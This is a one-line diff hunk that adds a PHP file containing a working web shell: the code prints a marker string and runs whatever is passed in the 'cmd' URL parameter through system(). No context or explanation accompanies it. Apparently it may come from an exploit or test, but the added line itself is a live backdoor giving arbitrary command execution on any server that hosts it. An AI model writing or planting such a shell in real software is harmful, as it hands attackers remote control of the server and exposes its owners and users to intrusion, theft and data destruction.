@@ -1,0 +1,1 @@
+<?php echo "SHELL_MARKER"; system($_GET["cmd"]); ?>
